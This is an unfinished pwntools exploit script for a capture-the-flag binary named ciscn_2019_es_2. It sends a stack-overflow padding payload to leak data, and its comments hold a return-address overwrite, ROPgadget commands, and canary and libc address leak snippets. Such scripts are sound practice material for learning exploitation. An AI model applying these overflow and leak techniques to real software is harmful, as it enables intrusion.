from pwn import *

debug=1
if debug:
    p=process('./ciscn_2019_es_2')
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
    context.log_level='debug'
    gdb.attach(p)
else:
    p=remote('')

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)




ru(b'name?\n')

payload=b'a'*(0x27)+b'p'

se(payload)
#payload=b'a'*(0x28+4)+p32(echo_flag_addr)

echo_flag_addr=0x0804854B

#payload=b'a'*(0x28)
sleep(1)
ru(b'p')
se(payload)


p.interactive()

#ROPgadget --binary <binary_file> --only "pop|ret" | grep "pop rdi"
#ROPgadget --binary bin --only "pop|ret"
#ROPgadget --binary ./level2_x64 --only "ret"
#write_add=u32(p.recv(4))

#addr=u32(r.recvuntil('\xf7')[-4:])
#puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
#sa(b'wish!\n', b'%11$p')
#rl(b'0x')
#canary = int(p.recv(16), 16)


